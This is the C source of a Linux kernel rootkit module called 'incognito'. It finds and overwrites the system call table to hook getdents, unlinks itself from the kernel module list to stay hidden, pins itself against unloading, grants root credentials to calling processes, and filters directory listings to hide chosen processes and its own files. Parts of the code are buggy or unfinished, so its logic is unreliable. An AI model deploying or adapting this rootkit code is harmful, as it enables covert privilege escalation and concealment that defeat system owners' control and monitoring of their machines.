/*
 * Copyright (C) 2018
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */


#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h> // task_struct definition
#include <asm/unistd.h>
#include <linux/list.h>
#include <linux/init_task.h>
#include <linux/kobject.h>
#include <linux/syscalls.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/utsname.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/proc_ns.h>

#include <asm/uaccess.h> //we are dealing with most recent kernel
#include <asm/unistd.h>



#include "config.h"

MODULE_LICENSE("GPL");

int incognito_init(void);
void incognito_exit(void);

#ifndef __KERNEL__
#define __KERNEL__
#endif

//for hiding pids and files/directories
const char * const HIDE_PS[] = {"bash", "ps"};
const char * const HIDE_FILES[] = {"hidetarget.txt", "config.h", "incognito.c", "README.md", "Makefile"};
#define INVISIBLE 0x10000000

//linux_dirent struct
//https://www.systutorials.com/docs/linux/man/2-getdents/
struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

// -----------------------SYSTEM CALL TABLE SECTION-----------------------------
unsigned long** sys_call_table;
#define HOOK(sys_call_table, originalFunction, hijackedFunction, __NR_index) \
	originalFunction = (void *)sys_call_table[__NR_index]; \
	sys_call_table[__NR_index] = (unsigned long*)&hijackedFunction

#define UNHOOK(sys_call_table, originalFunction, __NR_index)               \
	    sys_call_table[__NR_index] = (unsigned long*)originalFunction

//Need to list original system calls and the ones we are modifying
//we only need to hit a select few system calls to hide files, pids, and directories
//getdents is very important, hijacking it gets us hiding files and hiding processes
//-----------------------------Original call list------------------------------
asmlinkage long (*originalGetdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage long (*originalRead)(unsigned int fd, char *buf, size_t count);
asmlinkage long (*originalOpen)(const char __user *filename, int flags, umode_t mode);
asmlinkage long (*originalLstat)(const char __user *filename, struct __old_kernel_stat __user *statbuf);
asmlinkage long (*originalStat)(const char __user *filename, struct __old_kernel_stat __user *statbuf);

//------------------------------Hijacked call list------------------------------
asmlinkage long hijackedGetdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage long hijackedRead(unsigned int fd, char *buf, size_t count);
asmlinkage long hijackedOpen(const char __user *filename, int flags, umode_t mode);
asmlinkage long hijackedLstat(const char __user *filename, struct __old_kernel_stat __user *statbuf);
asmlinkage long hijackedStat(const char __user *filename, struct __old_kernel_stat __user *statbuf);

static int page_read_write(ulong address)
{
        uint level;
        pte_t *pte = lookup_address(address, &level);

        if(pte->pte &~ _PAGE_RW)
                pte->pte |= _PAGE_RW;
        return 0;
}

static int page_read_only(ulong address)
{
        uint level;
        pte_t *pte = lookup_address(address, &level);
        pte->pte = pte->pte &~ _PAGE_RW;
        return 0;
}

// -----------------------END SYSTEM CALL TABLE SECTION------------------------


// --------------------------------MODULE HIDE/UNHIDE ------------------------
//We can keep a list of other hidden modules if needed
struct list_head *mod_list;

//flag for hiding incognito
int hidden = 0;

void hide(void)
{
	if (hidden)
		return;

	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	mutex_unlock(&module_mutex);

	//update flag
	hidden = 1;
}

void reveal(void)
{
	if (!hidden)
		return;

	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	list_add(&THIS_MODULE->list, mod_list);
	mutex_unlock(&module_mutex);

	//update flag
	hidden = 0;
}

//--------------------------END MODULE HIDE/REVEAL----------------------------

//-------------------------MODULE PROTECT/UNPROTECT-------------------------
//https://www.kernel.org/doc/htmldocs/kernel-hacking/routines-module-use-counters.html
//We take advantage of the above to make incognito stick
//protection flag
int protected = 0;
void protect(void){
	if (protected){
		return;
	} else {
		try_module_get(THIS_MODULE);

		//update our protected flag
		protected = 1;
	}
}

void unprotect(void){
	if (!protected){
		return;
	} else {
		module_put(THIS_MODULE);

		//update our protected flag
		protected = 0;
	}
}

//----------------------------END PROTECT/UNPROTECT----------------------------

//---------------------------ROOT GET------------------------------------------
void root(void){
	//grants root to the process that calls this method
	struct cred *creds = prepare_creds();
	struct task_struct *task = current;

	//printk(KERN_INFO "changing %d - %s ; uid %d\n",task->pid,task->comm,task->real_cred->uid.val);
	creds->uid.val = 0;
	creds->euid.val = 0;
  creds->gid.val = 0;
	creds->egid.val = 0;
	//FYI THESE WILL CRASH LINUX
	//creds->suid.val = 0;
	//creds->sgid.val = 0;
	//creds->fsuid.val = 0;
	//creds->fsgid.val = 0;
	printk(KERN_WARNING "pid %d , %s is now root\n",task->pid,task->comm);

	commit_creds(creds);

}
//---------------------------END ROOT GET------------------------------------------


//---------------------------PROCESS HIDE------------------------------------------
int command_ps_check(uint fd){
	struct file *fdFile;
	struct inode *fdInode;

	//https://linux.die.net/man/8/fsck
	fdFile = fcheck(fd);
	if (unlikely(!fdFile)){
		return 0;
	}

	fdInode = file_inode(fdFile);
	if (fdInode->i_ino == PROC_ROOT_INO && imajor(fdInode) == 0 && iminor(fdInode) == 0) {
                //user typed ps command so return 1
                return 1;
        }
        return 0;
}

int hideCheck(char *pname){
        //Check if a given process name is in our "to-hide" list array HIDE_PS[]
        int i;
        for ( i = 0; i < sizeof(HIDE_PS) / sizeof(char *); i++){
		// Check if we got a match
                if (strcmp(pname, HIDE_PS[i]) == 0) {
                        return 1;
                }
        }
        //no matches, we return
        return 0;
}

long hideProcess(struct linux_dirent *dirp, long getdents){
        unsigned int offset;
        //http://man7.org/linux/man-pages/man2/getdents.2.html
        //read about the linux_dirent structure here ALL HAIL THE DIRP!!
        struct linux_dirent *currentd, *nextd;
        char *pname;
        char *dirname;
        char *direntPtr = (char *)dirp;
        size_t dirnameLength;
        pid_t pidNumber;
        //good ol' task_struct
        struct task_struct *procTask;
        struct pid *pid;

        int offsetError;

        //our getdents is the number of bytes read here
        for (offset = 0; offset < getdents;) {
                currentd = (struct linux_dirent *)(direntPtr + offset);
                dirname = currentd->d_name;
                dirnameLength = currentd->d_reclen - 2 - offsetof(struct linux_dirent, d_name);
                offsetError = kstrtoint_from_user(dirname, dirnameLength, 10, (int *)&pidNumber);
                //switch case to make sure we don't mess up in any spot
                //check the error
                if (offsetError < 0) {
                        goto next;
                }
                //get pid
                pid = find_get_pid(pidNumber);
                if (!pid){
                        goto next;
                }
                //get the task struct for current pid
                procTask = get_pid_task(pid, PIDTYPE_PID);
                if (!procTask){
                        goto next;
                }
                //get pname from current task struct
                pname = (char *)kmalloc((sizeof(procTask->comm)), GFP_KERNEL);
                if (!pname){
                        goto next;
                }

                //get_task_comm gets me errors so we use the above
                //pname = get_task_comm(pname, procTask);

                if (hideCheck(pname)){
                        // We hide the process by deleting its dirent: shift all its right dirents to left!
                        //debug check
                        printk("Hiding Process: %s\n", procTask->comm);
                        nextd = (struct linux_dirent *)((char *)currentd + currentd->d_reclen);
                        getdents = currentd->d_reclen;
                        //update offset
                        offset = offset - currentd->d_reclen;
                }
                //free pname allocation
                kfree(pname);
                //Next case: we update offset and move on
                next:
                        //update offset
                        offset = offset + currentd->d_reclen;
        }
        return getdents;
}

long processProcess(unsigned int fd, struct linux_dirent *dirp, long getdents){
    struct files_struct *openFiles = current->files;
    int psCheck = 0;
    spin_lock(&openFiles->file_lock);

    //check if the user is doing a "ps" command and if so mess with it
    psCheck = command_ps_check(fd);
    if (psCheck != 0){
        getdents = hideProcess(dirp, getdents);
    }

    spin_unlock(&openFiles->file_lock);
    return getdents;
}
//---------------------------END PROCESS HIDE--------------------------------------
//---------------------------GETDENTS HIJACK-------------------------------------
//This is used for hiding files and pids and is thus VERY IMPORTANT
asmlinkage long hijackedGetdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
	long getdents;
	//Fetch the original getdents sys call
	getdents = (*originalGetdents)(fd, dirp, count);

	//put getdents for ls (hiding files) here!!

	//get dents for hiding processes
	getdents = processProcess(fd, dirp, getdents);
        return 0;
}
//-----------------------------END GETDENTS------------------------------------
int __init incognito_init(void) {
  //find system call table address
	sys_call_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
	if (!sys_call_table){
		printk(KERN_ERR "Incognito error: Can't find the system call table!!\n");
		return -ENOENT;
	} else {
		printk("Incognito: System call table located!\n");
		//print off the address of the system call table
		printk(KERN_INFO "Sys call table address : %p\n", sys_call_table);
	}

	//Hides the module
	hide();

	//System Calls
	page_read_write((ulong)sys_call_table);
	//HOOK(sys_call_table, originalOpen, hijackedOpen, __NR_open);
	//HOOK(sys_call_table, originalLstat, hijackedLstat, __NR_lstat);
	//HOOK(sys_call_table, originalStat, hijackedStat, __NR_stat);
        //hook getdents
        HOOK(sys_call_table, originalGetdents, hijackedGetdents, __NR_getdents);

	page_read_only((ulong)sys_call_table);
	//Debug Print
    printk("incognito: module loaded\n");

	//we immediately reveal since we have no way to enter commands yet!
	//if you remove this atm you won't be able to find incognito >:)
	reveal();

  return 0;
}

void __exit incognito_exit(void) {

	//unhook our hijacked calls
	page_read_write((ulong)sys_call_table);
	//UNHOOK(sys_call_table, originalOpen, __NR_open);
	//UNHOOK(sys_call_table, originalLstat, __NR_lstat);
	//UNHOOK(sys_call_table, originalStat, __NR_stat);
    //Unhook getdents last (this unhides processes)
    UNHOOK(sys_call_table, originalGetdents, __NR_getdents);

	page_read_only((ulong)sys_call_table);


  printk("incognito: module removed\n");


}

module_init(incognito_init);
module_exit(incognito_exit);
